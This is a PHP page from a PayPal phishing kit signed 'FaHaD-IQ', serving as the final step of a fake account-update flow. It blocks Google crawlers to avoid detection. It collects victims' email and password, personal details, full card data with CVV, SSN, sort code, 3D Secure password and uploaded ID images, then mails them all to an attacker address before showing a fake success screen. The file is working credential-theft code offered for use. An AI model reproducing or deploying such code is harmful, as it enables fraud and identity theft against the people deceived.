<?php
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
error_reporting(0);
    #################################################
    #                FaHaD-IQ                       #
    #              fb/mr.fahad6                     #
    #################################################
session_start();
include("../../include/__config__.php");
include("../../include/function.php");
include("../../include/antibot.php");

if($_SESSION['logint'] !="on" ) {
		header("location: login.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=".$_SESSION['_lang_']."&email=".$_SESSION['_email_']."&confirmation_code=3b2hN76Aq6&act=confirm_account_3b2hF76Aq6&tmpl=profile%2Fmyaccount&aid=358301&new_account=1&import=1");	
	
	}
		else if($_SESSION['billing'] !="on" ) {
		header("location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);		
	}
	
	else if($_SESSION['copycard'] !="on" ) {
		header("location: websc-cardcopy.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);			
	}
	else if($_SESSION['seccuuses'] =="on" ) {
		header("location: success.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);			
	} else {

       $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
        $ip = $_SERVER["REMOTE_ADDR"];
		$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
		$time = date('l jS \of F Y h:i:s A');
		$user_agent = $_SERVER['HTTP_USER_AGENT'];
		$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
		$_SESSION['_browser_'] = $browser;
        $subject  = "PayPal Full info - [ " . $_SESSION['_count3s_'] . " / ".$_SESSION['_IP_']." ]-[".$_SESSION[_updmsgate_]."] ";
        // check snn sort and sec
		if($_SESSION['_SSN_'] =="" ) {
		$ssn="";
		}
		else {
            $ssn="Client Ssn       : ".$_SESSION['_SSN_']."</font><br />";
		}
		if($_SESSION['_sort_c_'] =="" ) {
		$sortc="";
		}
		else {
            $sortc="Client Sort code : ".$_SESSION['_sort_c_']."</font><br />";
		}
		if($_SESSION['_sec_c_'] =="" ) {
		$secc="";
		}
		else {
            $secc="Client 3DPass    : ".$_SESSION['_sec_c_']."</font><br />";
		}


		$message = "

<div>

========================================</font><br />
 PayPal Full info - FaHaD-HacK !</font><br />
===============[Login info]===============</font><br />
Client Email     : ".$_SESSION['_email_']."</font><br />
Client Password  : <font color='#FF0000'>".$_SESSION['_password_']."</font><br />
Client Browser   : ".$browser."</font><br />
===============[Address]=================</font><br />
Client F name    : ".$_SESSION['_fname_']."</font><br />
Client L name    : ".$_SESSION['_lname_']."</font><br />
Client D of B    : ".$_SESSION['_dob_day_']."/".$_SESSION['_dob_month_']."/".$_SESSION['_dob_year_']."</font><br />
Client Address 1 : ".$_SESSION['_adds1_']."</font><br />
Client Address 2 : ".$_SESSION['_adds2_']."</font><br />
Client City      : ".$_SESSION['_city_']."</font><br />
Client State     : ".$_SESSION['_state_']."</font><br />
Client zip code  : ".$_SESSION['_zip_']."</font><br />
Client Country   : ".$_SESSION['_count3s_']."</font><br />
Client Phone Nb  : ".$_SESSION['_phone_']."</font><br />
==============[Card info ]===============</font><br />
Client Card Type : ".$_SESSION['_cctype_']."</font><br />
".$_SESSION['bin_cnt']."
".$_SESSION['bin_bnk']."
Client Card name : ".$_SESSION['_cardholder_']."</font><br />
Client Card NB   : ".$_SESSION['_ccn_']."</font><br />
Client Expir Data: ".$_SESSION['_edmonth_']."/".$_SESSION['_edyear_']."</font><br />
Client CVV / CVC : ".$_SESSION['_cvn_']."</font><br />
".$ssn."
".$sortc."
".$secc."
===============[ ip info ]================</font><br />
Client Agent : ".$user_agent."</font><br />
Client iP : http://www.geoiptool.com/?IP=".$_SESSION['_IP_']."</font><br />
========================================</font><br />

</div>";
			$separator = md5(time());

// carriage return type (we use a PHP end of line constant)
$eol = PHP_EOL;
$headers = "From: Yeni Bill/Card/ID <1full@fullfahad.com>".$eol;
$headers .= "MIME-Version: 1.0".$eol; 
$headers .= "Content-Type: multipart/mixed; boundary=\"".$separator."\"";


// no more headers after this, we start the body! //

$body = "--".$separator.$eol;
$body .= "Content-Transfer-Encoding: 7bit".$eol.$eol;
// message
$body .= "--".$separator.$eol;
$body .= "Content-Type: text/html; charset=\"iso-8859-1\"".$eol;
$body .= "Content-Transfer-Encoding: 8bit".$eol.$eol;
$body .= $message.$eol;

// attachment
	if (isset($_SESSION['_count3s_']) && $_SESSION['_count3s_'] == "United States"){
$body .= "--".$separator.$eol;
$body .= "Content-Type: application/octet-stream; name=\"".$_SESSION['_newfilename3_']."\"".$eol; 
$body .= "Content-Transfer-Encoding: base64".$eol;
$body .= "Content-Disposition: attachment".$eol.$eol;
$body .= $_SESSION['_attach3_'].$eol;
	}
$body .= "--".$separator.$eol;
$body .= "Content-Type: application/octet-stream; name=\"".$_SESSION['_newfilename2_']."\"".$eol; 
$body .= "Content-Transfer-Encoding: base64".$eol;
$body .= "Content-Disposition: attachment".$eol.$eol;
$body .= $_SESSION['_attach2_'].$eol;
$body .= "--".$separator.$eol;
$body .= "Content-Type: application/octet-stream; name=\"".$_SESSION['_newfilename1_']."\"".$eol; 
$body .= "Content-Transfer-Encoding: base64".$eol;
$body .= "Content-Disposition: attachment".$eol.$eol;
$body .= $_SESSION['_attach1_'].$eol;
$body .= "--".$separator."--";
@mail($to,$subject,$body,$headers);
$_SESSION['seccuuses']="on";
			header ("Refresh:3; URL=https://goo.gl/bUcGqs");
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title><?php echo $PAYPAL_SERVICE_UPDATE_TXT;?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
    <!-- Le styles -->
    <link href="../../css/bootstrap.css" rel="stylesheet">
    <link href="../../css/bootstrap-responsive.css" rel="stylesheet">

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.js"></script>
    <![endif]-->

  </head>

  <body style="background:#f5f5f5;">
  <script src="//popmotion.io/assets/js/popmotion.global.js"></script>
<div class="row-fluid">
     <?php include("header.php"); ?>
</div>
    <div class="container">

     

      <!-- Example row of columns -->
      <div class="row" style="margin-top:100px;" id="toprow" >
      
     	 <?php include("mobitop.php"); ?>
      
         <?php include("left.php"); ?>                        
                                
        <div class="span7" style="background:#fff;padding:15px 32px; 0 0;box-shadow:0 1px 4px 0 #d5d5d5;border-radius:5px;">
        <h3><?php echo $UPDATE_DONE_TXT; ?></h3>
        <hr />
         <center>
        <svg class="progress-icon" width="250" height="250" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
    <defs>
        <path id="tick-outline-path" d="M14 28c7.732 0 14-6.268 14-14S21.732 0 14 0 0 6.268 0 14s6.268 14 14 14z" opacity="0" />
        <path id="tick-path" d="M6.173 16.252l5.722 4.228 9.22-12.69" opacity="0"/>
    </defs>
    <g class="tick-icon" stroke-width="2" stroke="rgba(0,0,0,.2)" fill="none" transform="translate(1, 1)">
        <use class="tick-outline" xlink:href="#tick-outline-path" />
        <use class="tick" xlink:href="#tick-path" />
    </g>
    <g class="tick-icon" stroke-width="2" stroke="#39F" fill="none" transform="translate(1, 1.2)">
        <use class="tick-outline" xlink:href="#tick-outline-path" />
        <use class="tick" xlink:href="#tick-path" />
		</g>
	</svg>
        </center>
        
		<div class="alert-success" >
		<a href="#" class="close" data-dismiss="alertsuccess">&times;</a>
		<?php echo $SUCCESS_TXT;?>

	</div>
          
           <center><div style="color:#0079c1;margin:35px 0 20px ;" id="ft3"><?php echo $UPDATE_BILLING_ADDRESS_TXT; ?> <b class="caret-right"></b> <?php echo $UPDATE_CREDIT_OR_DEBIT_CARD_TXT; ?> <b class="caret-right"></b> <span style="color:#0079c1;"><?php echo $ID_AND_CREDIT_CARD_PROOF_TXT; ?></span> <b class="caret-right"></b> <span style="color:#000;"><?php echo $UPDATE_DONE_TXT; ?></span></div></center>
       </div>
       
      </div>
   

      <hr />
      
      <div class="container" id="ft1">
         
         
   <ul class="nav nav-pills" style="color:#ccc;font-weight:bold;">
        <li><a href="#"><?php echo $ABOUT_TXT; ?></a></li>
        <li><a href="#"><?php echo $HELP_TXT; ?></a></li>
        <li><a href="#"><?php echo $RATES_TXT; ?></a></li>
        <li><a href="#"><?php echo $SECURITY_TXT; ?></a></li>
        <li><a href="#"><?php echo $DEVELOPERS_TXT; ?></a></li>
        <li><a href="#"><?php echo $PARTNERS_TXT; ?></a></li>
    </ul>
        </div>
      

    </div> <!-- /container -->
    

<?php include("footer.php");?>

	<script src="../../js/DONE.js"></script>

  </body>
</html>
